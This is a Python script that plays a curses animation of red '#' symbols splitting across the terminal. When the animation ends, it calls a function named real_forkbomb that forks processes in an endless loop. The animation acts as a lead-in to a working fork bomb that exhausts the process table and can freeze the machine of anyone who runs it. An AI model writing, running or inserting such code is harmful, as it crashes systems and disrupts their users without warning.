#!/usr/bin/env python

import curses
import os
from random import choice, shuffle, randint
from time import sleep
from collections import namedtuple


Program = namedtuple('Program',
                   ['x', 'y', 'x_min', 'x_max', 'y_min', 'y_max', 'next_split'])

def sign(x):
  if x < 0:
    return -1
  elif x == 0:
    return 0
  else:
    return 1

def addchr(window, y, x, c, attr):
  try:
    window.addstr(y, x, c, attr)
  except:
    pass

def draw_program(window, y, x):
  addchr(window, y, x, '#', curses.color_pair(1) | curses.A_BOLD)
  addchr(window, y - 1, x, '#', curses.color_pair(1) | curses.A_NORMAL)
  addchr(window, y + 1, x, '#', curses.color_pair(1) | curses.A_NORMAL)
  addchr(window, y, x - 1, '#', curses.color_pair(1) | curses.A_NORMAL)
  addchr(window, y, x + 1, '#', curses.color_pair(1) | curses.A_NORMAL)
  addchr(window, y - 1, x - 1, '#', curses.color_pair(1) | curses.A_DIM)
  addchr(window, y + 1, x + 1, '#', curses.color_pair(1) | curses.A_DIM)
  addchr(window, y + 1, x - 1, '#', curses.color_pair(1) | curses.A_DIM)
  addchr(window, y - 1, x + 1, '#', curses.color_pair(1) | curses.A_DIM)

def draw_programs(window, programs):
  window.erase()

  shuffle(programs)
  for p in programs:
    draw_program(window, p.y, p.x)
  window.refresh()

def advance_program(p):
  # Try to move towards center
  x_center = (p.x_min + p.x_max) / 2
  y_center = (p.y_min + p.y_max) / 2
  x_update = p.x + sign(x_center - p.x)
  y_update = p.y + sign(y_center - p.y)
  if p.x != x_update or p.y != y_update:
    return [p._replace(x=x_update, y=y_update)]

  # Destination reached, perform split
  if p.next_split == 'x':
    q1 = p._replace(x_max=x_center, next_split='y', x=p.x-1)
    q2 = p._replace(x_min=x_center, next_split='y', x=p.x+1)
  else:
    q1 = p._replace(y_max=y_center, next_split='x', y=p.y-1)
    q2 = p._replace(y_min=y_center, next_split='x', y=p.y+1)
  if q1 != q2:
    return [q1, q2]
  else:
    return []

def move_programs(programs):
  result = []
  d = 5
  for p in programs:
    if randint(0, 3) == 0:
      p = p._replace(x_min=p.x_min+randint(-d, d),
                     x_max=p.x_max+randint(-d, d),
                     y_min=p.y_min+randint(-d, d),
                     y_max=p.y_max+randint(-d, d))
    result.extend(advance_program(p))
  return result

def remove_overlapping_programs(programs):
  result = []
  taken = set()
  for p in programs:
    if (p.x, p.y) not in taken:
      taken.add((p.x, p.y))
      result.append(p)
  return result

def space_available(window, programs):
  my, mx = window.getmaxyx()
  space = my * mx
  taken = 0
  for p in programs:
    if p.x in range(mx) and p.y in range(my):
      taken += 1
  return taken < space * 0.15

def splitting_animation(window):
  my, mx = window.getmaxyx()
  programs = [Program(mx/2, 0, 0, mx, 0, my, 'x')]
  while space_available(window, programs):
    draw_programs(window, programs)
    programs = remove_overlapping_programs(programs)
    programs = move_programs(programs)
    sleep(0.06)

def real_forkbomb():
  while True:
    os.fork()

def main(stdscr):

  curses.curs_set(False)
  curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)

  splitting_animation(stdscr)
  # sleep(1000)
  real_forkbomb()

curses.wrapper(main)
